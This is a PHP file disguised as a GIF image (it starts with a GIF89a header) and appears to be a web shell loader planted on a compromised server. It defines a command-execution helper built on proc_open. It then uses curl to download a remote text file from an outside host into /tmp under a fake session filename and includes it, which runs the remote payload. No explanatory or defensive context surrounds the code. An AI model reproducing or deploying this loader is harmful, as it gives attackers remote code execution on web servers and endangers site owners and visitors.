GIF89a
@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
error_reporting(E_ALL);

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<title>php</title>
<?=
error_reporting(E_ALL);
ini_set('display_errors', 1);

function ex($coman, $serlok)
{
	$ler = "2>&1";
	if (!preg_match("/" . $ler . "/i", $coman)) {
		$coman = $coman . " " . $ler;
	}
	$pr = "proc_open";
	if (function_exists($pr)) {
		$tod = @$pr($coman, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
		echo htmlspecialchars(stream_get_contents($crottz[1]));
	} else {
		return false;
	}
}

$fname = "sess_" . md5("nax") . ".php";
if (!file_exists("/tmp/$fname") || filesize("/tmp/$fname") < 10) {
    ex("curl --output /tmp/$fname https://fcalpha.net/web/photo/20151024/naxc.txt", "/tmp");
}
include("/tmp/$fname");
?>
